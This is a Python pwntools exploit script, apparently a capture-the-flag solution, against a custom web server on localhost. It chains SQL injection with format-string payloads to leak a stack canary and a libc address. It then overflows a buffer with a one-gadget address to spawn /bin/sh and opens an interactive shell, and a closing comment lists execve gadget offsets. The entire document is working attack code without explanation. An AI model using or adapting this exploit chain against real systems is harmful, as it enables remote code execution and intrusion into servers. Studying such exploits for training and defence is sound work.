from pwn import *
p = remote("127.0.0.1",8080)

buf ="""POST /cart.html?cargo=-1); HTTP/1.1\r
Host: 127.0.0.1\r
User-Agent: ComputerVendor\r
Cookie: nilnilnilnil\r
Connection: close\r
Identity: unknown\r
Content-Length: 10\r
\r
a=1&cargo=1) union select '%41$p' ;# &"""
context.log_level = 'debug'
p.send(buf)
p.recvuntil('</html>')
canary = int(p.recvuntil('00'),16)
print '[+]canary',hex(canary)

p = remote("127.0.0.1",8080)

buf ="""POST /cart.html?cargo=-1); HTTP/1.1\r
Host: 127.0.0.1\r
User-Agent: ComputerVendor\r
Cookie: nilnilnilnil\r
Connection: close\r
Identity: unknown\r
Content-Length: 10\r
\r
a=1&cargo=1) union select '%75$p' ;# &"""
context.log_level = 'debug'
p.send(buf)
p.recvuntil('</html>')
libc_addr = int(p.recvuntil('30'),16)-0x20830
print '[+]libc_addr',hex(libc_addr)

p = remote("127.0.0.1",8080)

buf ="""POST /cart.html?product.html HTTP/1.1\r
Host: 127.0.0.1\r
User-Agent: ComputerVendor\r
Cookie: nilnilnilnil\r
Connection: close\r
Identity: unknown\r
Content-Length: 100\r
\r
a=1&id=1&"""
context.log_level = 'debug'
p.send(buf)
p.recvuntil('</html>')

p = remote("127.0.0.1",8080)

buf ="""POST /product.html? HTTP/1.1\r
Host: 127.0.0.1\r
User-Agent: ComputerVendor\r
Cookie: nilnilnilnil\r
Connection: close\r
Identity: unknown\r
Content-Length: 100\r
\r
a=1&id=111 union select 'overdueaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa','%s','%s','';&"""%(p64(canary).replace('\0','')+'aaaaaaaaaaaaaaaaaaaaaaa',p64(libc_addr+0x45216).replace('\0',''))
context.log_level = 'debug'
p.send(buf)
#p.recvuntil('</html>')
print '[+]',p64(canary)[1:]


p.interactive()

'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''